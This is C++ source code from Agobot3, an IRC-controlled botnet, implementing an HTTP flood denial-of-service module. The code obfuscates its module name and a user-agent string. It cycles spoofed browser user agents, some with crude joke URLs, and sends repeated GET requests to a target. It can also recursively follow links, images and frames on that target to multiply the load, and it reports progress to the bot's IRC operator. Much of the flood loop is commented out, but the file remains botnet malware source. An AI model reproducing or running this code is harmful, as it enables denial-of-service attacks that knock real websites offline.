/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. 

#include "main.h"
#include "httpflood.h"
#include "mainctrl.h"
#include "utility.h"

char *g_szUserAgents[]={

	"Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.6", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows  NT 5.1; Q312461)", 
	"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.lolyousuck.com)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts-MyWay; (R1 1.3); .NET CLR 1.1.4322)", 
	"Mozilla/4.75 [en]", 
	"Microsoft-WebDAV-MiniRedir/5.1.2600", 
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.5a) Gecko/20030728 Mozilla Firebird/0.6.1", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 1.0.3705)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Hotbar 4.3.1.0)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", 
	"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://i.love.teh.cock/support/crawler.asp)", 
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", 
	"Googlebot/2.1 (+http://www.googlebawt.com/bot.html)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avast Browser [avastye.com]; .NET CLR 1.1.4322)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avast Browser [avastye.com]; .NET CLR 1.1.4322)", 
	"Mozilla/5.0 (Slurp/si; slurp@inktomi.com; http://www.inktomi.com/slurp.html)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; DigExt)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; H010818; AT&T CSM6.0)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)", 
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.5a) Gecko/20030718", 
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)", 
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.5) Gecko/20031021", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ODI3 Navigator)", 
	"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.5) Gecko/20031007", 
	"Mozilla/5.0 (Slurp/cat; vaginamook@inktomi.com; http://www.supercocklol.com/slurp.html)", 
	NULL };


CDDOSHTTPFlood::CDDOSHTTPFlood() { m_sDDOSName.Assign(dp(8,20,20,16,6,12,15,15,4,0).CStr()); }

CString DoHTTPRequest(const char *szRequest, url &uURL)
{	int sSocket, d;
	
	sSocket=DoTcpConnect(uURL.sHost.CStr(), uURL.iPort);
	if(sSocket==SOCKET_ERROR) return CString("");

	xWrite(sSocket, szRequest, strlen(szRequest));
	
	char szBuf[4096]; CString sReply("");
	while(true)
	{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
		if(i<4096) szBuf[i]=0; sReply.Append(szBuf);
		for(d=0;d<i;d++) if(!strncmp(szBuf+d,"\r\n\r\n",4))
		{	goto done_http; } }
done_http:
	while(true)
	{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
		if(i<4096) szBuf[i]=0; sReply.Append(szBuf); }

	xClose(sSocket); sSocket=SOCKET_ERROR;

	return sReply;
}

void CDDOSHTTPFlood::StartDDOS() {
	int iNumSent=0; url uURL; init_random();

	if(!ParseURL(m_sURL.CStr(), &uURL)) {
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
			"[%s] Failed parsing \"%s\".", m_sDDOSName.CStr(), m_sURL.CStr());
		return; }

	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"[%s] Flooding %s:%u %u times with a %d ms Delay.", m_sDDOSName.CStr(), \
		uURL.sHost.CStr(), uURL.iPort, m_iNumber, m_iDelay);

	/*int iNumUserAgents=0; 
	while(g_szUserAgents[iNumUserAgents]) iNumUserAgents++; 
	iNumUserAgents--;

	while(g_cMainCtrl.m_cDDOS.m_bDDOSing && iNumSent < m_iNumber) {
		//int iUserAgent=brandom(0, iNumUserAgents);
		char *szUserAgent = dp(39,15,26,9,12,12,1,82,72,79,68,78,61,3,15,13,16,1,20,9,2,12,5,78,39,45,35,31,78,74,79,68,78,49,9,14,4,15,23,19,78,40,46,78,73,79,69,78,79,40,31,46,78,29,38,44,78,69,79,69,79,72,71,70,70,62,0).Str();
		CString sSendBuf, sReqHost;
		
		if(uURL.iPort==80) {
			sReqHost.Format("Host: %s", uURL.sHost.CStr());
		} else {
			sReqHost.Format("Host: %s:%d", uURL.sHost.CStr(), uURL.iPort);
		}

		sSendBuf.Format("GET %s HTTP/1.1\r\n" \
			"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, *\r\n" \
			"Accept-Language: en-us,en\r\n" \
			"User-Agent: %s\r\n" \
			"%s\r\n" \
			"Referer: %s\r\n" \
			"Connection: close\r\n\r\n", \
			uURL.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sReferrer.CStr());

		CString sReply=DoHTTPRequest(sSendBuf.CStr(), uURL);

		while(m_bRecursive) {
			url uURLTemp; if(!sReply.Find('<')) break;
			CString sTemp=sReply.Mid(sReply.Find('<')); sReply=sTemp;
			CString sFullTag=sReply.Mid(0, (sReply.GetLength()-(sReply.GetLength()-sReply.Find('>')))-1);
			CString sTag=sFullTag.Token(0, " ");

			if(!sTag.CompareNoCase("meta") && sFullTag.Find("\"Refresh\"")) {
				CString sContent=sFullTag.Token(3, " ");
				sTemp=sContent.Mid(sContent.Find('=')); sContent=sTemp;
				sTemp=sContent.Mid(0, sContent.GetLength()-1); sContent=sTemp;
				CString sURL(sContent);

				if(ParseURL(sURL.CStr(), &uURLTemp)) {
					sSendBuf.Format("GET %s HTTP/1.1\r\n" \
						"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, *\r\n" \
						"Accept-Language: en-us,en\r\n" \
						"User-Agent: %s\r\n" \
						"%s\r\n" \
						"Referer: %s\r\n" \
						"Connection: close\r\n\r\n", \
						uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

					DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
				}
			} else if(!sTag.CompareNoCase("a")) {
				int iCount=0; CString sToken(sFullTag.Token(iCount, " ").Token(0, "="));
				while(sToken.CompareNoCase("href") && sToken.Compare("")) {
					iCount++; sToken.Assign(sFullTag.Token(iCount, " ").Token(0, "="));
				}
				if(sToken.Compare("")) {
					CString sLink(sFullTag.Token(iCount, " ").Token(1, "=", true)), sURL;
					if(sLink[0]=='/')
						sURL.Format("http://%s:%d%s", uURL.sHost.CStr(), uURL.iPort, sLink.CStr());
					else if(sLink.Find("http://")) {
						sURL.Assign(sLink);
					} else {
						sURL.Format("http://%s:%d%s%s", uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr(), sLink.CStr());
					}

					if(ParseURL(sURL.CStr(), &uURLTemp)) {
						sSendBuf.Format("GET %s HTTP/1.1\r\n" \
							"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, *\r\n" \
							"Accept-Language: en-us,en\r\n" \
							"User-Agent: %s\r\n" \
							"%s\r\n" \
							"Referer: %s\r\n" \
							"Connection: close\r\n\r\n", \
							uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

						DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
					}
				}
			} else if(!sTag.CompareNoCase("img")) {
				int iCount=0; CString sToken(sFullTag.Token(iCount, " ").Token(0, "="));
				while(sToken.CompareNoCase("src") && sToken.Compare("")) {
					iCount++; sToken.Assign(sFullTag.Token(iCount, " ").Token(0, "="));
				}
				if(sToken.Compare("")) {
					CString sLink(sFullTag.Token(iCount, " ").Token(1, "=", true)), sURL;
					if(sLink[0]=='/')
						sURL.Format("http://%s:%d%s", uURL.sHost.CStr(), uURL.iPort, sLink.CStr());
					else if(sLink.Find("http://")) {
						sURL.Assign(sLink);
					} else {
						sURL.Format("http://%s:%d%s%s", uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr(), sLink.CStr());
					}

					if(ParseURL(sURL.CStr(), &uURLTemp)) {
						sSendBuf.Format("GET %s HTTP/1.1\r\n" \
							"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, *\r\n" \
							"Accept-Language: en-us,en\r\n" \
							"User-Agent: %s\r\n" \
							"%s\r\n" \
							"Referer: %s\r\n" \
							"Connection: close\r\n\r\n", \
							uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

						DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
					}
				}
			} else if(!sTag.CompareNoCase("frame") || !sTag.CompareNoCase("iframe")) {
				int iCount=0; CString sToken(sFullTag.Token(iCount, " ").Token(0, "="));
				while(sToken.CompareNoCase("src") && sToken.Compare("")) {
					iCount++; sToken.Assign(sFullTag.Token(iCount, " ").Token(0, "="));
				}
				if(sToken.Compare("")) {
					CString sLink(sFullTag.Token(iCount, " ").Token(1, "=", true)), sURL;
					if(sLink[0]=='/')
						sURL.Format("http://%s:%d%s", uURL.sHost.CStr(), uURL.iPort, sLink.CStr());
					else if(sLink.Find("http://")) {
						sURL.Assign(sLink);
					} else {
						sURL.Format("http://%s:%d%s%s", uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr(), sLink.CStr());
					}

					if(ParseURL(sURL.CStr(), &uURLTemp)) {
						sSendBuf.Format("GET %s HTTP/1.1\r\n" \
							"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, *\r\n" \
							"Accept-Language: en-us,en\r\n" \
							"User-Agent: %s\r\n" \
							"%s\r\n" \
							"Referer: %s\r\n" \
							"Connection: close\r\n\r\n", \
							uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

						DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
					}
				}
			}
		}

		int iSleep; if(!m_iDelay) iSleep=brandom(3600000, 86400000); else iSleep=m_iDelay;

		Sleep(iSleep); iNumSent++; }
	
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"[%s] Finished flooding %s:%u", m_sDDOSName.CStr(), uURL.sHost.CStr(), uURL.iPort);
}
*/